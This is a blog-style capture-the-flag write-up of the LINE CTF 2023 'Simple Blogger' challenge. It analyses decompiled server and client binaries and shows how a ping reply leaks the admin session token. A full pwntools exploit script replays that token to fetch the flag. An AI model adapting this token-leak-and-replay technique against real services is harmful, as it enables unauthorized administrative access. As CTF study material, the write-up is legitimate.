---
title: "LINE CTF '23 simple blogger"
style: border
color: success
comments: true
description: LINE CTF's cool pwn challenge
tags: Pwn
---

# Simple Blogger

Last week, I tried out two CTFs (Umass and LINE). The Umass CTF was kind of easy (solved pwn in 2nd place, should start earlier next time), I and wanted to challenge myself. So I took upon an attempt to solve a challenge from a CTF that is a bit more well known for its diffuculty, the LINE CTF.

Spoiler, I couldn't solve it in time; but this is a kind of a recap and a review note about things I learned along while solving this challenge.

## Analysis

The first impression of this challenge was a bit startling, as the files given looked very different from the usual files given at other CTFs.

It looked like:
```bash
> # ls
agent  client  docker-compose.yml  init.sql  server  start_server.sh  stop_server.sh
```

There are three folders: agent, client, and server, some scripts and Dockerfiles to deploy a test environment.

However, I am more concerned about ```init.sql``` and the contents of ```client``` and ```server``` as they will be used heavily over the duration of interaction with the challenge.

```init.sql``` looks like this:
```sql
CREATE TABLE blog(id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(20), message VARCHAR(500));
INSERT INTO blog(name, message) VALUES('Super Admin', '<script>alert("XSS")</script>');

CREATE TABLE account(id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(20), user VARCHAR(20), pass VARCHAR(20));
INSERT INTO account(name, user, pass) VALUES('super_admin', 'super_admin', HEX(RANDOMBLOB(16)));
INSERT INTO account(name, user, pass) VALUES('admin', 'admin', HEX(RANDOMBLOB(16)));
INSERT INTO account(name, user, pass) VALUES('guest', 'guest', 'guest');

CREATE TABLE sess(token BLOB, priv INT);
INSERT INTO sess(token, priv) VALUES(RANDOMBLOB(16), 1);
```

It is creating three tables, blog, account, and sess respectively, and is storing contents such as user and pass, and session values within each table.

Let's take a look at ```server```.
```bash
> # ls
Dockerfile  flag  nsjail  nsjail.cfg  server_nix  server_nix.i64  simple_blogger.db
```

I'm not super familiar with these config and db files, but what we really need to care about are the binaries. Here, the binary ```server_nix``` serves as a server-side binary that receives requests from the client and sends back response.

```client``` folder also has a similar ```client_nix``` binary inside that serves as a client program to connect to the server.

Finally, ```agent``` is a sort of an independent helper client that runs this Python script as a Cron job that refreshes the admin's session token every minute (```admin_janitor.py```):
```python
from pwn import *
import struct, os, binascii

HOST = 'server'
ADMIN_USER = os.getenv('ADMIN_USER')
ADMIN_PASS = os.getenv('ADMIN_PASS')
PORT = 13443
TIMEOUT = 3

def auth():
    payload = b'\x01\x02'
    payload += b'\x41'*16
    cred = '{0}:{1}'.format(ADMIN_USER, ADMIN_PASS)
    cred_len = len(cred)
    payload += struct.pack('>H', cred_len)
    payload += cred.encode('utf-8')
    print(payload)
    return payload

def extract_sess(auth_res):
    sess = auth_res[4:]
    return sess

def clear_db(sess):
    payload = b'\x01\x01'
    payload += sess
    payload += b'\x00\x04'
    payload += b'PING'
    return payload

def connect(payload):
    r = remote(HOST, PORT)
    r.send(payload)
    data = r.recvrepeat(TIMEOUT)
    r.close()
    return data

res = connect(auth())
extracted_sess = extract_sess(res)
clear_res = connect(clear_db(extracted_sess))
print(binascii.hexlify(clear_res), end="")
```

cron:
```bash
* * * * * /usr/local/bin/python -u /usr/src/app/admin_janitor.py
```

It took me a bit to absorb the overall setup, and now I could be more comfortable when approaching similar problems in the future.

Now let's see the actual binaries we're going to exploit.
Take a look at ```server_nix```'s method I named ```pong```:
```c
void __fastcall pong(__int64 a1, int a2, int a3, int a4, int a5, int a6, __int64 a7, char req)
{
  __int64 v8; // rdx
  __int64 v9; // [rsp+10h] [rbp-50h] BYREF
  __int64 v10; // [rsp+18h] [rbp-48h] BYREF
  char src[4]; // [rsp+20h] [rbp-40h] BYREF
  __int64 data[5]; // [rsp+24h] [rbp-3Ch] BYREF
  int data_prep; // [rsp+4Ch] [rbp-14h]
  void *response; // [rsp+50h] [rbp-10h]
  __int64 *column_blob; // [rsp+58h] [rbp-8h]
                                                // SERVER
  response = malloc(0x410uLL);
  if ( !strncmp(&req, "PING", 4uLL) )
  {
    memcpy(src, "PONG", 5uLL);
    data_prep = sqlite3_open_v2("simple_blogger.db", &v10, 2LL, 0LL);
    if ( !data_prep )
    {
      *(&data[3] + 4) = "SELECT token FROM sess WHERE rowid == 1";
      data_prep = sqlite3_prepare_v3(v10, "SELECT token FROM sess WHERE rowid == 1", 0xFFFFFFFFLL, 1LL, &v9, 0LL);
      if ( !data_prep )
      {
        data_prep = sqlite3_step(v9);
        if ( data_prep == 100 )
          column_blob = sqlite3_column_blob(v9, 0LL);
      }
    }
    v8 = column_blob[1];
    data[0] = *column_blob;
    data[1] = v8;
    sqlite3_finalize(v9);
    sqlite3_close_v2(v10);
    if ( auth(a1) )
      sub_4024C5(data);
    *response = 1;
    *(response + 1) = 0;
    *(response + 1) = a7;
    memcpy(response + 16, src, *(response + 1));
    send_data(response);
  }
  else
  {
    *response = 1;
    *(response + 1) = 1;
    *(response + 1) = 17LL;
    strncpy(response + 16, "INVALID_OPERATION", *(response + 1));
    send_data(response);
  }
  free(response);
}
```

After receiving a request from a client, the server will redirect the request to different methods such as ```pong```, ```auth```, etc.

By analyzing ```server_nix```'s pong method and ```admin_janitor.py```, we can see that the general packet format is:
- 1 byte of signature/version (\x01)
- 1 byte of menu selection (\x01 to \x06)
- 16 bytes of session token
- 2 bytes of size of data
- followed by data

You could play around and analyze different methods as you like, but I'll get right into methods that I will be working with while exploiting.

Then let's see ```client_nix```:
```c
void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  uint16_t v3; // ax
  _QWORD *token; // rbx
  uint16_t port; // ax
  int v6; // eax
  _QWORD *v7; // rbx
  unsigned __int16 v8; // ax
  _QWORD *v9; // rbx
  unsigned __int16 v10; // ax
  _QWORD *v11; // rbx
  unsigned __int16 v12; // ax
  _QWORD *v13; // rbx
  unsigned __int16 v14; // ax
  void *s; // [rsp+18h] [rbp-448h] BYREF
  char user_in[1036]; // [rsp+20h] [rbp-440h] BYREF
  int choice; // [rsp+42Ch] [rbp-34h]
  void *ptr; // [rsp+430h] [rbp-30h]
  int v19; // [rsp+43Ch] [rbp-24h]
  char *argv2; // [rsp+440h] [rbp-20h]
  const char *server; // [rsp+448h] [rbp-18h]

  server = a2[1];
  argv2 = a2[2];
  if ( a1 != 3 )
  {
    printf("Usage: %s [SERVER_IP] [PORT] \nExample: %s 192.168.1.100 13443\n", *a2, *a2);
    exit(1);
  }
  if ( sub_402612(server, a2, a3) != 1 || sub_402641(argv2) != 1 )
  {
    puts("Invalid IPv4/Port");
    exit(1);
  }
  v3 = atoi(argv2);
  v19 = attempt_connect(server, v3);
  if ( v19 == -1 )
  {
    puts("Connection error");
    flag(-1);
    exit(1);
  }
  flag(v19);
  menu();
  s = malloc(0x14uLL);
  memset(s, 0, 16uLL);                          // 16 byte token
  while ( 1 )
  {
    printf("CONSOLE> ");
    fflush(stdout);
    fflush(stdin);
    fgets(user_in, 1024, stdin);
    user_in[strcspn(user_in, "\r\n")] = 0;
    ptr = malloc(0x50uLL);
    if ( sanity_check(user_in) )
    {
      choice = atoi(user_in);
      switch ( choice )
      {
        case 1:
          menu();
          break;
        case 2:
          print_logo();
          break;
        case 3:
          token = s;
          port = atoi(argv2);
          ping(server, port, token);
          break;
        case 4:
          v6 = atoi(argv2);
          login(server, v6, ptr, &s);
          break;
        case 5:
          v7 = s;
          v8 = atoi(argv2);
          logout(server, v8, v7);
          break;
        case 6:
          v9 = s;
          v10 = atoi(argv2);
          read_msg(server, v10, v9);
          break;
        case 7:
          v11 = s;
          v12 = atoi(argv2);
          write_msg(server, v12, v11);
          break;
        case 8:
          v13 = s;
          v14 = atoi(argv2);
          print_flag(server, v14, v13);
          break;
        case 9:
          flag(v19);
          free(ptr);
          free(s);
          exit(0);
        default:
          break;
      }
    }
    free(ptr);
  }
}
```

client_nix will construct the request packet for you to be sent. 

Let's see method ```ping``` within ```client_nix```:
```c
void __fastcall ping(const char *server, uint16_t port, _QWORD *token)
{
  char *rest_of_payload; // rcx
  __int64 v4; // rdx
  void *ptr; // [rsp+28h] [rbp-428h] BYREF
  char buf[1026]; // [rsp+30h] [rbp-420h] BYREF
  int v8; // [rsp+432h] [rbp-1Eh]
  __int16 v9; // [rsp+436h] [rbp-1Ah]
  int result; // [rsp+438h] [rbp-18h]
  int channel; // [rsp+43Ch] [rbp-14h]
  void *request; // [rsp+440h] [rbp-10h]
  size_t size; // [rsp+448h] [rbp-8h]
                                                // CLIENT
  v9 = 0x400;
  v8 = 'GNIP';
  size = 24LL;
  request = malloc(24uLL);
  memset(request, 1, 1uLL);                     // first byte is 1
  memset(request + 1, 1, sizeof(char));         // second byte is 1 (ping)
  rest_of_payload = request + 2;
  v4 = token[1];
  *(request + 2) = *token;
  *(rest_of_payload + 1) = v4;
  *(request + 9) = v9;                          // size
  *(request + 5) = v8;
  channel = attempt_connect(server, port);
  if ( channel == -1 )
  {
    puts("Connection error");
    flag(-1);
    free(request);
  }
  else
  {
    result = send_data(channel, request, size);
    if ( result == -1 )
    {
      puts("Connection Error");
      free(request);
      flag(channel);
    }
    else
    {
      read_data(channel, buf);
      ptr = malloc(0x410uLL);
      copy_data(buf, &ptr);
      if ( *(ptr + 1) || !strncmp(ptr + 16, "PONG", 4uLL) )
        puts(ptr + 16);                         // prints only "PONG"
      else
        puts("SERVER_ERROR");
      free(request);
      free(ptr);
      flag(channel);
    }
  }
}
```
We see that after sending the ping packet, it only prints out the data, but in fact, the client receives much more than that.

## Vuln

We're particularly interested in ```pong``` within ```server_nix``` because the vulnerability lies within the method. 

If we look back at pong again, if stores the session token of ```rowid==1```, which is equivalent to storing the admin's.
```c 
*(&data[3] + 4) = "SELECT token FROM sess WHERE rowid == 1";
```

And that is sent back to the client. Client receives the packet with admin's session token, but does not print it.

### Plan
We could exploit this by replicating the packet, receive response, dump the admin session token, and use it to authenticate as admin to print the flag.

## Exploit

The first part of the exploitation is to construct the ping packet, which can be written as:
```python
req = b'\x01\x01' # version and menu (ping)
req += b'A'*16 # sess
req += b'\x04\x00' # size
req += b'PING'
```

Here, I put 16 A's as session token as it doesn't matter for the ping request.

Then I would receive a response from the server containing "PONG."

:warning: Here, you could figure out where the admin's session token lie by storing a recognizable sequence of characters on the admin's token within ```init.sql``` and launching a test container and analyze the response (I put 16 A's). We can observe that it is 16 bytes from 8th to 23rd byte of the packet as shown here:
```bash
[DEBUG] Received 0x404 bytes:
    00000000  01 00 04 00  50 4f 4e 47  41 41 41 41  41 41 41 41  │····│PONG│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  00 00 00 00  00 00 00 00  │AAAA│AAAA│····│····│
    00000020  00 00 00 00  f0 41 40 00  00 00 00 00  15 00 00 00  │····│·A@·│····│····│
    00000030  64 00 00 00  10 7f d9 01  00 00 00 00  98 4e db 01  │d···│····│····│·N··│
    00000040  00 00 00 00  60 03 3d 67  fe 7f 00 00  c2 32 40 00  │····│`·=g│····│·2@·│
    00000050  00 00 00 00  00 04 00 00  00 00 00 00  50 49 4e 47  │····│····│····│PING│
    00000060  0a 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000070  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    *
    00000400  00 00 00 00                                         │····│
    00000404
```

Then we reuse the session token to construct another packet to authenticate as an admin and print the flag.

We can invoke the ```flag``` method by putting '\x06' as menu, which can look like:
```python
get_flag = b'\x01\x06' # version and menu (flag)
get_flag += sess # admin's session
get_flag += b'\x04\x00' # size
```

Then we can get the flag.

### Full Exploit
```python
#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=remote('0.0.0.0', 13443)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

req = b'\x01\x01' # version and menu (ping)
req += b'A'*16 # sess
req += b'\x04\x00' # size
req += b'PING'

sl(req)

res = p.recv(0x404)

sess = res[8:24]

get_flag = b'\x01\x06'
get_flag += sess
get_flag += b'\x04\x00'

sl(get_flag)

p.interactive()
```

...

```bash
[DEBUG] Received 0x15 bytes:
    00000000  01 00 00 11  4c 49 4e 45  43 54 46 7b  72 65 64 61  │····│LINE│CTF{│reda│
    00000010  63 74 65 64  7d                                     │cted│}│
    00000015
```

### Remark

This was a pretty cool challene as I was required to analyze both binaries running on the server and the client.
It wasn't a sort of challenge I saw before and was a really good learning experience.

As always, thank you for reading to the end,

079
